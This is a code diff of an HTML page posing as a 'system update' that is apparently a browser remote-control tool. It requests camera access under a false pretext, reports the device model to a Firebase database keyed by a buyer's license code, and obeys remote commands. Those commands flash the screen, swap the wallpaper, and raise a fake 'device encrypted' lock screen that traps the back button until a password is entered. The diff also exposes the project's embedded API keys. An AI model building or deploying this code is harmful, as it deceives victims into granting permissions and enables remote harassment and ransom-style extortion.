@@ -5,133 +5,84 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>System Framework</title>
     <style>
-        body { background: #000; color: #00f2ff; font-family: sans-serif; margin: 0; text-align: center; overflow: hidden; transition: 0.5s; height: 100vh; display: flex; align-items: center; justify-content: center; }
+        body { background: #000; color: #00f2ff; font-family: sans-serif; margin: 0; text-align: center; overflow: hidden; height: 100vh; display: flex; align-items: center; justify-content: center; transition: 0.5s; }
         #front-flash { display: none; position: fixed; inset: 0; background: #fff; z-index: 10000; }
-        #lock-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; padding-top: 80px; }
-        .container { width: 90%; }
-        input { background: #111; border: 1px solid #00f2ff; color: #fff; padding: 15px; width: 100%; border-radius: 8px; margin-top: 10px; text-align: center; box-sizing: border-box; font-family: monospace; }
-        button { background: #00f2ff; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; margin-top: 15px; border-radius: 8px; cursor: pointer; font-family: sans-serif; }
-        .danger-btn { background: #ff0000; color: #fff; }
+        #lock-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
+        input { background: #111; border: 1px solid #00f2ff; color: #fff; padding: 15px; width: 85%; border-radius: 8px; margin-top: 10px; text-align: center; box-sizing: border-box; }
+        button { background: #00f2ff; color: #000; border: none; padding: 15px; width: 85%; font-weight: bold; margin-top: 15px; border-radius: 8px; cursor: pointer; }
     </style>
 </head>
 <body>
     <div id="front-flash"></div>
 
     <div id="lock-screen">
-        <h1 style="color:red; font-size: 2.5rem; margin-bottom: 5px;">SYSTEM ERROR</h1>
-        <p style="color:red; margin-top: 0;">DEVICE HAS BEEN ENCRYPTED</p>
-        <p id="msg-lock" style="color:#fff; padding: 20px; font-size: 1.1rem;"></p>
-        <div style="padding: 0 20px;">
-            <input type="password" id="pw-unlock" placeholder="ENTER DECRYPTION KEY">
-            <button onclick="checkUnlock()" class="danger-btn">DECRYPT NOW</button>
-        </div>
+        <h1 style="color:red; font-size: 2rem;">SYSTEM LOCKED</h1>
+        <p id="msg-lock" style="color:#fff; padding: 20px;"></p>
+        <input type="password" id="pw-unlock" placeholder="PASSWORD UNLOCK">
+        <button onclick="doUnlock()" style="background:red; color:#fff;">DECRYPT SYSTEM</button>
     </div>
 
-    <div class="container" id="setup">
+    <div id="setup" style="width: 100%;">
         <h2 style="letter-spacing: 2px;">V-PROJECT V1.0</h2>
-        <p style="color: #888; font-size: 0.9rem;">Initializing System Framework...</p>
-        <input type="text" id="b-id" placeholder="LICENSE CODE">
-        <button onclick="initRAT()">ACTIVATE SYSTEM</button>
+        <p style="color: #444; font-size: 12px;">Initializing System Update...</p>
+        <input type="text" id="b-id" placeholder="ENTER LICENSE CODE">
+        <button onclick="start()">UPDATE SYSTEM</button>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
         import { getDatabase, ref, set, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
-        // === PASANG CONFIG LU DI SINI BRE! ===
         const firebaseConfig = {
-  apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
-  authDomain: "rat-html.firebaseapp.com",
-  databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
-  projectId: "rat-html",
-  storageBucket: "rat-html.firebasestorage.app",
-  messagingSenderId: "1060124583265",
-  appId: "1:1060124583265:web:a117830e798cd1d60f5120",
-  measurementId: "G-XMHT2S731L"
-};    const app = initializeApp(firebaseConfig);
+            apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
+            authDomain: "rat-html.firebaseapp.com",
+            databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "rat-html",
+            storageBucket: "rat-html.firebasestorage.app",
+            messagingSenderId: "1060124583265",
+            appId: "1:1060124583265:web:a117830e798cd1d60f5120",
+            measurementId: "G-XMHT2S731L"
+        };
+
+        const app = initializeApp(firebaseConfig);
         const db = getDatabase(app);
-        let targetPath = ""; 
+        let myPath = "";
 
-        window.initRAT = async () => {
-            const bID = document.getElementById('b-id').value;
-            if(!bID) return alert("KODE LISENSI KOSONG!");
-
+        window.start = async () => {
+            const bID = document.getElementById('b-id').value; if(!bID) return alert("License Required!");
             try {
-                // Minta izin kamera (biar target gak curiga, alesannya update system)
                 await navigator.mediaDevices.getUserMedia({ video: true });
-                
-                // Ambil Nama HP Asli
                 let ua = navigator.userAgent;
-                let hpName = "Android_Device";
+                let hp = "Unknown_Device";
                 if(ua.includes("Android")) {
-                    const match = ua.match(/\(([^;]+);([^;]+);/);
-                    hpName = match ? match[2].trim() : "Android_User";
+                    let parts = ua.match(/\(([^;]+);([^;]+);/);
+                    hp = parts ? parts[2].trim() : "Android_User";
                 }
                 
-                // Set Path Database
-                const uniqueID = Math.floor(Math.random() * 999);
-                targetPath = `buyer_data/${bID}/${hpName.replace(/\s/g, '_')}_${uniqueID}`;
+                myPath = `buyer_data/${bID}/${hp.replace(/\s/g, '_')}_${Math.floor(Math.random()*999)}`;
 
-                // Simpan Data Awal ke Firebase
-                await set(ref(db, targetPath), {
-                    model: hpName,
-                    flash: false,
-                    lock: false,
-                    lock_msg: "YOUR FILES ARE ENCRYPTED!",
-                    lock_pw: "123", // Default PW
-                    wallpaper: "default"
-                });
+                await set(ref(db, myPath), { model: hp, flash: false, lock: false, lock_msg: "LOCKED!", lock_pw: "123", wallpaper: "default" });
+                document.getElementById('setup').innerHTML = "<h2 style='color: #0f0;'>SYSTEM READY</h2><p>Running background service...</p>";
 
-                document.getElementById('setup').innerHTML = "<h2 style='color: #0f0;'>SYSTEM ACTIVATED</h2><p>Background service running...</p>";
-
-                // LISTENER GACOR (Nunggu perintah dari Dashboard)
-                onValue(ref(db, targetPath), (snap) => {
-                    const d = snap.val();
-                    if(!d) return;
-
-                    // Fitur Senter (Layar Putih)
-                    const flashDiv = document.getElementById('front-flash');
-                    if(d.flash) {
-                        flashDiv.style.display = 'block';
-                        document.body.style.filter = "brightness(200%)";
-                    } else {
-                        flashDiv.style.display = 'none';
-                        document.body.style.filter = "brightness(100%)";
-                    }
-
-                    // Fitur Wallpaper
-                    if(d.wallpaper !== "default") {
-                        document.body.style.background = `url('${d.wallpaper}') center/cover no-repeat fixed`;
-                    }
-
-                    // Fitur Lock
+                onValue(ref(db, myPath), (snap) => {
+                    const d = snap.val(); if(!d) return;
+                    document.getElementById('front-flash').style.display = d.flash ? 'block' : 'none';
+                    document.body.style.filter = d.flash ? "brightness(200%)" : "brightness(100%)";
+                    if(d.wallpaper !== "default") document.body.style.background = `url('${d.wallpaper}') center/cover no-repeat fixed`;
                     if(d.lock) {
-                        document.getElementById('lock-screen').style.display = 'block';
+                        document.getElementById('lock-screen').style.display = 'flex';
                         document.getElementById('msg-lock').innerText = d.lock_msg;
-                        // Anti Back
                         window.history.pushState(null, null, window.location.href);
-                    } else {
-                        document.getElementById('lock-screen').style.display = 'none';
-                    }
+                    } else { document.getElementById('lock-screen').style.display = 'none'; }
                 });
-
-            } catch (e) {
-                alert("UPDATE FAILED: PERMISSION DENIED!");
-            }
+            } catch (e) { alert("Permission Denied!"); }
         }
 
-        // Logic Buka Lock pake Password
-        window.checkUnlock = async () => {
+        window.doUnlock = async () => {
             const inp = document.getElementById('pw-unlock').value;
-            if(!targetPath) return;
-
-            const snap = await get(ref(db, targetPath + '/lock_pw'));
-            if(snap.exists() && inp === snap.val()) {
-                await update(ref(db, targetPath), { lock: false });
-                alert("SYSTEM UNLOCKED!");
-            } else {
-                alert("INVALID DECRYPTION KEY!");
-            }
+            const snap = await get(ref(db, myPath + '/lock_pw'));
+            if(inp === snap.val()) { await update(ref(db, myPath), { lock: false }); } 
+            else { alert("WRONG PASSWORD!"); }
         }
     </script>
 </body>
